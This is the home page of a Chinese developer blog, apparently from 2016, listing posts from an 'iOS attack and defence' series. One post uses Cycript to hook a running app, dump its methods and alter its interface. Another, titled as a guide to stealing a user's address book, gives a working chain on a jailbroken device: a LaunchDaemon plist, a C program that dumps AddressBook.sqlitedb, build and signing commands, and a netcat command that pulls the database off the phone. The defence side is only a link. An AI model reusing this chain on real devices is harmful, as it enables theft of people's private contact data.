<!doctype html>



  


<html class="theme-next muse use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="小鱼のCODE_HOME" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta name="description" content="技术宅 iOS开发 JAVA开发 萌妹子">
<meta property="og:type" content="website">
<meta property="og:title" content="小鱼のCODE_HOME">
<meta property="og:url" content="http://zhoulingyu.com/index.html">
<meta property="og:site_name" content="小鱼のCODE_HOME">
<meta property="og:description" content="技术宅 iOS开发 JAVA开发 萌妹子">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="小鱼のCODE_HOME">
<meta name="twitter:description" content="技术宅 iOS开发 JAVA开发 萌妹子">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>




  <link rel="canonical" href="http://zhoulingyu.com/"/>

  <title> 小鱼のCODE_HOME </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">小鱼のCODE_HOME</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">技术宅 iOS开发 JAVA开发 萌妹子</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/about.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/07/19/iOS攻防——（三）Cycript攻·防/" itemprop="url">
                  iOS攻防——（三）Cycript攻·防
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-07-19T14:09:36+08:00" content="2016-07-19">
              2016-07-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/07/19/iOS攻防——（三）Cycript攻·防/" class="leancloud_visitors" data-flag-title="iOS攻防——（三）Cycript攻·防">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序。<br>Cycript是一个理解Objective-C语法的javascript解释器，它能够挂钩正在运行的进程，能够在&gt; 运行时修改应用的很多东西。</p>
<ol>
<li>能够挂钩正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第三方库，甚至程序的delegate的名称。</li>
<li>对于一个特定的类，例如View Controller, App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。</li>
<li>能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。</li>
<li>能够在运行时修改实例变量的值。</li>
<li>能够执行Method Swizzling，例如替换一个特定方法的实现。</li>
<li>可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。</li>
</ol>
</blockquote>
<h1 id="Cycript安装"><a href="#Cycript安装" class="headerlink" title="Cycript安装"></a>Cycript安装</h1><p>在<a href="http://www.cycript.org" target="_blank" rel="external">这里下载</a><br>在<a href="">这里阅读</a>所有Cycript诡计</p>
<h1 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h1><p>先看看怎么用Cycript干点坏事吧</p>
<h2 id="1-给应用弹一个莫名其妙的alert"><a href="#1-给应用弹一个莫名其妙的alert" class="headerlink" title="1. 给应用弹一个莫名其妙的alert"></a>1. 给应用弹一个莫名其妙的alert</h2><h3 id="ssh登陆你的手机（如果不会，上一篇有-）"><a href="#ssh登陆你的手机（如果不会，上一篇有-）" class="headerlink" title="ssh登陆你的手机（如果不会，上一篇有~）"></a>ssh登陆你的手机（如果不会，上一篇有~）</h3><h3 id="找一个app"><a href="#找一个app" class="headerlink" title="找一个app"></a>找一个app</h3><p>这里我找的是以前做的一个app</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps aux | grep blackwidow</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mobile 466 6.6 7.0 508416 36204 ?? Ss 11:22AM 0:09.65 /xxxx/blackwidow</div></pre></td></tr></table></figure>
<p>这样知道进程号是466</p>
<h3 id="hock住"><a href="#hock住" class="headerlink" title="hock住"></a>hock住</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cycript -p 466</div></pre></td></tr></table></figure>
<p>如果你看到出现了cy#，说明你可以开始编写Cycript代码了</p>
<h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 找到widnow</span></div><div class="line">var window = [<span class="built_in">UIApplication</span> sharedApplication].keyWindow;</div><div class="line"><span class="comment">// 初始化一个alert</span></div><div class="line">var alert = [[<span class="built_in">UIAlertView</span> alloc] initWithTitle:<span class="string">@"hack you"</span> message:<span class="string">@"hack you"</span> window cancelButtonTitle:<span class="string">@"cancel"</span> otherButtonTitles:<span class="string">@"yes"</span>, <span class="literal">nil</span>];</div><div class="line"><span class="comment">// 弹出来吧</span></div><div class="line">[alert show];</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-01.PNG-w375" alt=""></p>
<h2 id="2-探索一个app"><a href="#2-探索一个app" class="headerlink" title="2. 探索一个app"></a>2. 探索一个app</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">  <span class="keyword">var</span> methods = class_copyMethodList(objc_getClass(className), count);</div><div class="line">  <span class="keyword">var</span> methodsArray = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</div><div class="line">    <span class="keyword">var</span> method = methods[i];</div><div class="line">    methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;);</div><div class="line">  &#125;</div><div class="line">  free(methods);</div><div class="line">  <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(AppDelegate)</div></pre></td></tr></table></figure></p>
<p>输出结果：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>是不是觉得发生了很可怕的事情？该有的都被打印出来了。</p>
<p>你还可以通过试探的方式找出每一个Controller的名字，例如：</p>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> homeVC= [[[[[UIApplication sharedApplication] keyWindow] subviews] objectAtIndex:<span class="number">0</span>] nextResponder];</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;HomePageTabBarViewController: 0x156cf200&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> page0VC = [homeVC.childViewControllers objectAtIndex:<span class="number">3</span>]</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;BaseNavigationController: 0x156decc0&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var meVC = page0VC.topViewController</div></pre></td></tr></table></figure></p>
<p>print<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;MeViewController: 0x156de940&gt;&quot;</div></pre></td></tr></table></figure></p>
<p>这样，我们就找到了『我的』页面所属Controller。</p>
<p>查看所有的方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(MeViewController)</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>改个标题试试：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[meVC setCurrentTitle:<span class="string">@"hack you"</span>];</div></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-04.PNG-w375" alt=""></p>
<p>试想一下，如果MeViewController中或者LoginViewController中有一个方法叫getUserInfo，那么通过Cycript就可以轻而易举的拿到用户信息。</p>
<p>不过Cycript在这里最主要的作用还是偷窥APP和调试APP。<br>当然，好玩的方法还有很多。</p>
<h1 id="防"><a href="#防" class="headerlink" title="防"></a>防</h1><p>知道了Cycript的可怕，在有重要信息藏在代码中的时候，我们也得学会如何放置Cycript修改运行时。</p>
<p>你可以参考<a href="http://www.cocoachina.com/ios/20150511/11801.html" target="_blank" rel="external">这篇文章</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x63;&#111;&#100;&#x65;&#114;&#x66;&#105;&#115;&#x68;&#64;&#49;&#54;&#51;&#46;&#x63;&#x6f;&#109;">&#x63;&#111;&#100;&#x65;&#114;&#x66;&#105;&#115;&#x68;&#64;&#49;&#54;&#51;&#46;&#x63;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/" itemprop="url">
                  iOS攻防——（二）如何窃取用户的通讯录信息
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-07-12T21:31:24+08:00" content="2016-07-12">
              2016-07-12
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/" class="leancloud_visitors" data-flag-title="iOS攻防——（二）如何窃取用户的通讯录信息">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章基于念茜的iOS攻防系列。<br>本文将会讲解如何窃取用户的通讯录信息。<br>同样在越狱手机环境下。</p>
<h1 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h1><h2 id="1-需要一个plist"><a href="#1-需要一个plist" class="headerlink" title="1. 需要一个plist"></a>1. 需要一个plist</h2><p>需要这样一个plist，它看起来是这样：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png" alt=""></p>
<p>源文件是这样：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Program<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardErrorPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/null<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>SessionCreate<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>inetdCompatibility<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Wait<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">false</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Sockets<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Listeners<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">key</span>&gt;</span>SockServiceName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>55<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>SockServiceName指的是通信名称<br>将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/zhoulingyu/Desktop/hack.plist root@192.168.31.152:/System/Library/LaunchDaemons/hack.plist</div></pre></td></tr></table></figure>
<h2 id="2-了解一下OS-X的启动原理"><a href="#2-了解一下OS-X的启动原理" class="headerlink" title="2. 了解一下OS X的启动原理"></a>2. 了解一下OS X的启动原理</h2><blockquote>
<ol>
<li>mac固件激活，初始化硬件，加载BootX引导器。</li>
<li>BootX加载内核与内核扩展(kext)。</li>
<li>内核启动launchd进程。</li>
<li>launchd根据/System/Library/LaunchAgents、/System/Library/LaunchDaemons、/Library/LaunchDaemons、Library/LaunchAgents、~/Library/LaunchAgents里的plist配置，启动服务守护进程</li>
</ol>
</blockquote>
<p>解释一下：</p>
<blockquote>
<p>LaunchDaemons是用户未登陆前就启动的服务（守护进程）<br>LaunchAgents是用户登陆后启动的服务（守护进程）</p>
</blockquote>
<p>几个目录下plist文件格式及每个字段的含义：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Key</th>
<th style="text-align:left">Description</th>
<th style="text-align:center">Required</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Label</td>
<td style="text-align:left">The name of the job</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">ProgramArguments</td>
<td style="text-align:left">Strings to pass to the program when it is executed</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">UserName</td>
<td style="text-align:left">The job will be run as the given user, who may not necessarily be the one who submitted it to launchd.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">inetdCompatibility</td>
<td style="text-align:left">Indicates that the daemon expects to be run as if it were launched by inetd</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">Program</td>
<td style="text-align:left">The path to your executable. This key can save the ProgramArguments key for flags and arguments.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">onDemand</td>
<td style="text-align:left">A boolean flag that defines if a job runs continuously or not</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">RootDirectory</td>
<td style="text-align:left">The job will be?chrooted?into another directory</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">ServiceIPC</td>
<td style="text-align:left">Whether the daemon can speak IPC to launchd</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">WatchPaths</td>
<td style="text-align:left">Allows launchd to start a job based on modifications at a file-system path</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">QueueDirectories</td>
<td style="text-align:left">Similar to WatchPath, a queue will only watch an empty directory for new files</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartInterval</td>
<td style="text-align:left">Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">StartCalendarInterval</td>
<td style="text-align:left">Job scheduling. The syntax is similar to cron.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">HardResourceLimits</td>
<td style="text-align:left">Controls restriction of the resources consumed by any job</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">LowPriorityIO</td>
<td style="text-align:left">Tells the kernel that this task is of a low priority when doing file system I/O</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">Sockets</td>
<td style="text-align:left">An array can be used to specify what socket the daemon will listen on for launch on demand</td>
<td style="text-align:center">no</td>
</tr>
</tbody>
</table>
<p>iOS基本类似，我基本是参照这个来的。</p>
<p>所以上面的plist实际上是要求系统启动一个进程。<br>一个名为<code>hack</code>的进程，可执行文件的路径是/usr/bin/hack。</p>
<h2 id="3-编写读取通讯录数据程序"><a href="#3-编写读取通讯录数据程序" class="headerlink" title="3. 编写读取通讯录数据程序"></a>3. 编写读取通讯录数据程序</h2><p>iTunes Store的数据都在<code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>中，只要能能拿出AddressBook.sqlitedb就可以非法拿到用户的数据。</p>
<p>那么现在编写一个程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span>   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>   </span></div><div class="line">   </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE <span class="meta-string">"/var/mobile/Library/AddressBook/AddressBook.sqlitedb"</span>   </span></div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">    <span class="keyword">int</span> fd = open(FILE, O_RDONLY);   </div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];   </div><div class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;   </div><div class="line">       </div><div class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)   </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;   </div><div class="line">    <span class="keyword">while</span> (( ret = read(fd, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>)&#123;   </div><div class="line">        write( fileno(<span class="built_in">stdout</span>), buf, ret);   </div><div class="line">    &#125;   </div><div class="line">    close(fd);   </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用同样的方法编译、传输：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o hack hack.c</div></pre></td></tr></table></figure>
<p>签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ldid -S hack</div><div class="line">mv hack /usr/bin</div></pre></td></tr></table></figure>
<h2 id="4-抓取-iTunesstore-数据信息"><a href="#4-抓取-iTunesstore-数据信息" class="headerlink" title="4. 抓取 iTunesstore 数据信息"></a>4. 抓取 iTunesstore 数据信息</h2><p>利用netcat，指定之前定义的服务名称，抓取设备 iTunesstore 信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.31.152 55 &gt; itunesstored2.sqlitedb</div></pre></td></tr></table></figure>
<p>OK，在MAC查看一下内容。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#99;&#111;&#x64;&#101;&#114;&#102;&#105;&#115;&#x68;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;">&#99;&#111;&#x64;&#101;&#114;&#102;&#105;&#115;&#x68;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/07/11/iOS攻防——（一）ssh登陆与交叉编译/" itemprop="url">
                  iOS攻防——（一）ssh登陆与交叉编译
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-07-11T20:49:11+08:00" content="2016-07-11">
              2016-07-11
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
